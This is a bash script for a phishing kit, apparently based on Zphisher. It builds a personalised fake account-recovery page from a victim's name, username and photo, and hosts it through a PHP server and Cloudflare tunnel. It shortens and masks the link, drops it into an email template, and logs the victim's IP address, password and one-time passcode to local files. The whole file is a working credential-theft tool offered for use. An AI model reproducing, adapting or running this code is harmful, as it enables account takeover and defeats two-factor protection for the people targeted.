v_info(){
	{ clear; banner; }
	echo -e "\n${RESETBG}\033[96m► Enter Victim Information \e[0m"

    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Name: \e[0m' v_name
    sed 's+v_name+'"${v_name//+/\\+}"'+g' .new/adv/ab.html > .new/adv/recover.html

    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Username: \e[0m' v_username
    v_username="${v_username//[[:space:]]/}"
    sed -i 's+v_username+'"${v_username//+/\\+}"'+g' .new/adv/recover.html

    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Picture Link: \e[0m' v_pic_link
    v_pic_link="${v_pic_link//[[:space:]]/}"

    # Check if the link is provided
    if [ -n "$v_pic_link" ]; then
        # Download the picture using the provided link
        wget -q "$v_pic_link" -O .new/adv/img.jpg
        echo "Picture downloaded successfully."
    else
        echo "No picture link provided."
    fi
}

# Remove old recover.html and img.jpg if they exist
remove_files() {
    if [ -f .new/adv/recover.html ]; then
        rm .new/adv/recover.html
    fi

    if [ -f .new/adv/img.jpg ]; then
        rm .new/adv/img.jpg
    fi
}

__version__="1.0"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080' 

## ANSI colors (FG & BG)
RED="$(printf '\033[0;91m')"
GREEN="$(printf '\033[0;92m')"
ORANGE="$(printf '\033[0;33m')"
BLUE="$(printf '\033[0;34m')"
MAGENTA="$(printf '\033[0;35m')"
CYAN="$(printf '\033[0;96m')"
WHITE="$(printf '\033[0;37m')"
YELLOW="$(printf '\033[0;93m')"
BLACK="$(printf '\033[0;30m')"

REDBG="$(printf '\033[0;41m')"
GREENBG="$(printf '\033[0;42m')"
ORANGEBG="$(printf '\033[0;43m')"
BLUEBG="$(printf '\033[0;44m')"
MAGENTABG="$(printf '\033[0;45m')"
CYANBG="$(printf '\033[0;46m')"
WHITEBG="$(printf '\033[0;47m')"
BLACKBG="$(printf '\033[0;40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${GREEN}[${RED}!${GREEN}]${GREEN} Program Interrupted." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Kill already running process
kill_pid() {
	check_PID="php cloudflared"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}


## Banner

banner() {
    cat << EOF
${MAGENTA}╔═══════════════════════════════════╗
${RED}   ___  __     __ 🇮​​🇳​​🇸​​🇵​​🇮​​🇷​​🇪​​🇩 ​​__🇿​​🇵​​🇭​​🇮​​🇸​​🇭​​🇪​​🇷​ ${RESETBG}
${GREEN}  |__  |__) _ |__) |__| | /__\` |__|  ${RESETBG}
${YELLOW}  |    |__)   |    |  | | .__/ |  |  ${RESETBG}
${GREEN}      𝐇𝐀𝐓-𝐀𝐁𝐌${CYAN} ■ 𝐁𝐃𝟖𝐊𝐑𝟑𝐌${RESETBG}
${MAGENTA}╚═══════════════════════════════════╝ ${WHITE} ${__version__} ${RESETBG}
EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

## Choose custom port
cusport() {
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
}

## Setup website and start php server
setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf .new/"$website"/* .server/www
	cp -f .new/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
}


## Initialize variables
PASSWORD=""
OTP=""

## Get credentials
capture_creds() {
    if [[ -n "$PASSWORD" ]]; then
        # Print password if it's available
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
        echo "$PASSWORD" >> auth/passwords.dat
        PASSWORD=""  # Reset password for next capture
    fi

    if [[ -n "$OTP" ]]; then
        # Print OTP/OTP if it's available
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} OTP : ${BLUE}$OTP"
        echo "$OTP" >> auth/otp.dat
        OTP=""   # Reset OTP for next capture
    fi

    # Check if usernames.txt exists before concatenating
    if [[ -e ".server/www/usernames.txt" ]]; then
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
        cat .server/www/usernames.txt >> auth/usernames.dat
    else
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Happy Hacking..."
    fi
}

## Print data
capture_data() {
    echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
    while true; do
        if [[ -e ".server/www/ip.txt" ]]; then
            echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
            capture_ip
            rm -rf .server/www/ip.txt
        fi
        sleep 0.75
        if [[ -e ".server/www/usernames.txt" ]]; then
            echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Password Found !!"
            # Extract password and save it
            PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
            rm -rf .server/www/usernames.txt  # Remove usernames.txt to avoid processing it again
            capture_creds  # Call capture_creds to print only password
        fi
        sleep 0.75
        if [[ -e ".server/www/log.txt" ]]; then
            echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} OTP Found !!"
            # Extract OTP/OTP and save it
            OTP=$(grep -o 'OTP:.*' .server/www/log.txt | awk '{print $2}')
            rm -rf .server/www/log.txt  # Remove log.txt to avoid processing it again
            capture_creds  # Call capture_creds to print only OTP/OTP
        fi
        sleep 0.75
    done
}



## Start Cloudflared
start_cloudflared() { 
	rm .cld.log > /dev/null 2>&1 &
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	sleep 8
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
	custom_url "$cldflr_url"
	 sed 's+link+'"${cldflr_url//+/\\+}"'+g' e.html > email.html
	capture_data
}

## Start localhost
start_localhost() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}


custom_url() {
	url=${1#http*//}
	isgd="https://is.gd/create.php?format=simple&url="
	shortcode="https://api.shrtco.de/v2/shorten?url="
	tinyurl="https://tinyurl.com/api-create.php?url="

	{ custom_mask; sleep 1; clear; banner; }
	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
		if [[ $(site_stat $isgd) == 2* ]]; then
			shorten $isgd "$url"
		elif [[ $(site_stat $shortcode) == 2* ]]; then
			shorten $shortcode "$url"
		else
			shorten $tinyurl "$url"
		fi

		url="https://$url"
		masked_url="$mask@$processed_url"
		processed_url="https://$processed_url"
	else
		# echo "[!] No url provided / Regex Not Matched"
		url="Unable to generate links. Try after turning on hotspot"
		processed_url="Unable to Short URL"
	fi

	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}$url"
	
}



## Custom Mask URL
custom_mask() {
    mask="https://"  # Set the default mask URL here

    echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using default Masked Url :${GREEN} $mask"
}

## URL Shortner
site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }

shorten() {
	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	if [[ "$1" == *"shrtco.de"* ]]; then
		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	else
		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
		processed_url=${short#http*//}
	fi
}


## Tunnel selection
tunnel_menu() {
	{ clear; banner; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_cloudflared;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}


## Menu
main_menu() {
    clear
    echo
    website="adv"
    tunnel_menu
}




## Main
remove_files
kill_pid
dependencies
v_info
install_cloudflared
main_menu
